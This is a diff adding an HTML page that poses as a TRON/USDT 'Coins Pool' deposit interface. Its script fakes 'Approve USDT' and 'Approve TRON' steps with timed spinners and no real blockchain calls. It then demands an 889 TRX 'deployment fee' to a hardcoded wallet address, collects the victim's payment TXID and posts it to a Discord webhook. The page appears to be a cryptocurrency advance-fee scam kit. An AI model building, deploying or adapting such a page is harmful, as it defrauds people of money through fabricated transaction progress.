@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width,initial-scale=1.0">
+
+<title>Pool Validation</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+}
+
+body{
+background:#020617;
+font-family:Arial,sans-serif;
+color:#fff;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+overflow:hidden;
+padding:20px;
+}
+
+.popup{
+width:100%;
+max-width:420px;
+background:#0f172a;
+border-radius:20px;
+padding:20px;
+overflow-y:auto;
+max-height:95vh;
+border:1px solid rgba(255,255,255,0.08);
+box-shadow:0 0 40px rgba(0,0,0,0.5);
+}
+
+.title{
+font-size:24px;
+font-weight:bold;
+text-align:center;
+margin-bottom:20px;
+}
+
+.card{
+background:#111827;
+padding:15px;
+border-radius:14px;
+margin-bottom:15px;
+}
+
+.label{
+font-size:13px;
+color:#94a3b8;
+margin-bottom:8px;
+}
+
+.value{
+font-size:18px;
+font-weight:bold;
+}
+
+button{
+width:100%;
+padding:14px;
+border:none;
+border-radius:12px;
+background:#dc2626;
+color:white;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+margin-top:12px;
+}
+
+button:disabled{
+opacity:0.5;
+cursor:not-allowed;
+}
+
+.status{
+margin-top:10px;
+font-size:14px;
+text-align:center;
+}
+
+.spinner{
+width:18px;
+height:18px;
+border:3px solid rgba(255,255,255,0.3);
+border-top:3px solid #fff;
+border-radius:50%;
+display:inline-block;
+animation:spin 1s linear infinite;
+vertical-align:middle;
+margin-right:8px;
+}
+
+@keyframes spin{
+100%{
+transform:rotate(360deg);
+}
+}
+
+.modal{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.8);
+display:none;
+justify-content:center;
+align-items:center;
+padding:20px;
+}
+
+.modal-box{
+background:#0f172a;
+padding:20px;
+border-radius:20px;
+width:100%;
+max-width:420px;
+}
+
+.qr{
+width:220px;
+height:220px;
+background:#fff;
+margin:20px auto;
+display:flex;
+justify-content:center;
+align-items:center;
+border-radius:12px;
+color:#000;
+font-weight:bold;
+}
+
+.address{
+word-break:break-all;
+background:#111827;
+padding:12px;
+border-radius:10px;
+margin-top:15px;
+font-size:14px;
+}
+
+.copy-btn{
+margin-top:10px;
+background:#2563eb;
+}
+
+input{
+width:100%;
+padding:14px;
+background:#111827;
+border:none;
+border-radius:12px;
+color:white;
+margin-top:10px;
+outline:none;
+}
+
+.top-alert{
+position:fixed;
+top:20px;
+right:20px;
+background:#16a34a;
+padding:14px 20px;
+border-radius:12px;
+display:none;
+z-index:999;
+font-size:14px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="top-alert" id="alertBox">
+Confirming payment...
+</div>
+
+<div class="popup">
+
+<div class="title">
+Coins Pool
+</div>
+
+<div class="card">
+<div class="label">Network</div>
+<div class="value">TRON</div>
+</div>
+
+<div class="card">
+<div class="label">Pair</div>
+<div class="value">USDT (TRC20)</div>
+</div>
+
+<div class="card">
+<div class="label">Deposit Amount</div>
+<div class="value">10,000 USDT</div>
+</div>
+
+<div class="card">
+
+<div class="label">
+Approve USDT
+</div>
+
+<div style="font-size:14px;color:#94a3b8;">
+You need to approve USDT before proceeding.
+</div>
+
+<button id="approve1">
+Approve USDT
+</button>
+
+<div class="status" id="status1"></div>
+
+</div>
+
+<div class="card">
+
+<div class="label">
+Approve TRON
+</div>
+
+<div style="font-size:14px;color:#94a3b8;">
+You need to approve TRON before continuing.
+</div>
+
+<button id="approve2" disabled>
+Approve TRON
+</button>
+
+<div class="status" id="status2"></div>
+
+</div>
+
+<div class="card">
+
+<div style="font-size:14px;color:#94a3b8;">
+kindly Pay the deployment fee to continue the service.
+</div>
+
+<button id="feeBtn" disabled>
+Pay 889 TRX
+</button>
+
+</div>
+
+<button id="createPool" disabled>
+Create Pool
+</button>
+
+</div>
+
+<div class="modal" id="modal">
+
+<div class="modal-box">
+
+<h2 style="text-align:center;">
+Scan QR Code
+</h2>
+
+<div class="qr">
+QR 
+</div>
+
+<div class="address" id="walletAddress">
+TAnW9wrzbTo1Hafe4x2mKZFFqytuJpMqp6
+</div>
+
+<button class="copy-btn"
+onclick="copyAddress()">
+Copy Address
+</button>
+
+<div style="margin-top:20px;">
+I've Paid
+</div>
+
+<input
+id="txid"
+placeholder="Paste payment TXID"
+/>
+
+<button id="submitTx">
+Submit
+</button>
+
+</div>
+
+</div>
+
+<script>
+
+const approve1 =
+document.getElementById("approve1");
+
+const approve2 =
+document.getElementById("approve2");
+
+const feeBtn =
+document.getElementById("feeBtn");
+
+const createPool =
+document.getElementById("createPool");
+
+approve1.onclick = ()=>{
+
+approve1.disabled = true;
+
+document.getElementById("status1").innerHTML =
+'<span class="spinner"></span> Approving...';
+
+setTimeout(()=>{
+
+document.getElementById("status1").innerHTML =
+'✅ Approved';
+
+approve2.disabled = false;
+
+},6000);
+
+};
+
+approve2.onclick = ()=>{
+
+approve2.disabled = true;
+
+document.getElementById("status2").innerHTML =
+'<span class="spinner"></span> Approving...';
+
+setTimeout(()=>{
+
+document.getElementById("status2").innerHTML =
+'✅ Approved';
+
+feeBtn.disabled = false;
+
+},6000);
+
+};
+
+feeBtn.onclick = ()=>{
+
+alert("Pay Now");
+
+document.getElementById("modal").style.display =
+"flex";
+
+};
+
+function copyAddress(){
+
+navigator.clipboard.writeText(
+document.getElementById("walletAddress").innerText
+);
+
+alert("Address copied");
+
+}
+
+document.getElementById("submitTx").onclick =
+async ()=>{
+
+const txid =
+document.getElementById("txid").value;
+
+document.getElementById("alertBox").style.display =
+"block";
+
+document.getElementById("alertBox").innerHTML =
+"Confirming payment...";
+
+/*
+DISCORD WEBHOOK
+*/
+
+await fetch(
+"https://YOUR_DISCORD_WEBHOOK_URL",
+{
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+
+content:
+`🚨 NEW  TXID
+
+TXID:
+${txid}
+
+TIME:
+${new Date().toLocaleString()}
+
+STATUS:
+Pending Review`
+})
+}
+);
+
+setTimeout(()=>{
+
+document.getElementById("alertBox").innerHTML =
+"✅ Demo Payment Submitted";
+
+feeBtn.innerHTML =
+"Payment Confirmed";
+
+createPool.disabled = false;
+
+},3000);
+
+};
+
+</script>
+
+</body>
+</html>
